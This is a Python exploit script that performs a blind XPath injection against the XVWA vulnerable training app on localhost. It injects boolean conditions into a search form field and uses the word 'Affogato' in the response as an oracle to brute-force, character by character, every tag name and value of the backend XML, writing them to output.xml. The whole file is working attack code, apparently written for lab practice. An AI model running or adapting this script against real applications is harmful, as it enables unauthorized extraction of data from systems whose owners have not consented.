#!/usr/bin/python3

from pwn import *

import requests
import time
import sys
import string
import signal

def sigint_handler(sig, frame):
    print("\n\n[!] Aborting...")
    sys.exit(1)

signal.signal(signal.SIGINT, sigint_handler)


target_url = "http://127.0.0.1:8000/xvwa/vulnerabilities/xpath/"
characters = string.ascii_letters + string.digits + ' '

def get_tag_name_size(path):
    for size in range(1, 200):
        post_data = {
            'search': "1' and string-length(name(%s)) = '%d" % (path, size),
            'submit': ''
        }

        response = requests.post(target_url, data=post_data)

        if "Affogato" in response.text:
            return size

def get_subtags_count(path):
    for count in range(1, 200):
        post_data = {
            'search': "1' and count(%s/*) = '%d" % (path, count),
            'submit': ''
        }

        response = requests.post(target_url, data=post_data)

        if "Affogato" in response.text:
            return count

    return 0


def get_tag_value_length(path):
    for size in range(1, 2000):
        post_data = {
            'search': "1' and string-length(%s) = '%d" % (path, size),
            'submit': ''
        }

        response = requests.post(target_url, data=post_data)

        if "Affogato" in response.text:
            return size

def get_tag_value(path):
    size = get_tag_value_length(path)

    tag_value = ''
    for position in range(1, size + 1):
        for character in characters:
            post_data = {
                'search': "1' and substring(%s, %d, 1) = '%s" % (path, position, character),
                'submit': ''
            }

            response = requests.post(target_url, data=post_data)

            if 'Affogato' in response.text:
                tag_value += character
                break
    
    return tag_value


def get_tag_name(path):
    tag_name = ''
    size = get_tag_name_size(path)
    
    for position in range(1, size + 1):
        for character in characters:
            post_data = {
                'search': "1' and substring(name(%s), %d, 1) = '%s" % (path, position, character),
                'submit': ''
            }

            response = requests.post(target_url, data=post_data)

            if 'Affogato' in response.text:
                tag_name += character
                break

    return tag_name

def bruteforce_tag(path):
    tag_name = get_tag_name(path)
    indent = path.count('/*') - 1

    print("%s<%s>" % ("\t" * indent, tag_name))
    write_to_file("%s<%s>" % ("\t" * indent, tag_name))

    subtags_count = get_subtags_count(path)

    if subtags_count == 0:
        tag_value = get_tag_value(path)
        print("%s%s" % ("\t" * (indent + 1), tag_value))
        write_to_file("%s%s" % ("\t" * (indent + 1), tag_value))
    else:
        for i in range(1, subtags_count + 1):
            bruteforce_tag("%s/*[%d]" % (path, i))

    print("%s</%s>" % ("\t" * indent, tag_name))
    write_to_file("%s</%s>" % ("\t" * indent, tag_name))

def write_to_file(content):
    f = open("output.xml", "a")
    f.write("%s\n" % (content))
    f.close()

def clear_file():
    f = open("output.xml", "w")
    f.write("")
    f.close

def discover_xml():
    attack_progress = log.progress("Attack")
    attack_progress.status("Starting brute force attack")
    clear_file()
    time.sleep(2)

    bruteforce_tag("/*[1]")

    attack_progress.success("Finished brute force attack")

if __name__ == "__main__":
    discover_xml() 
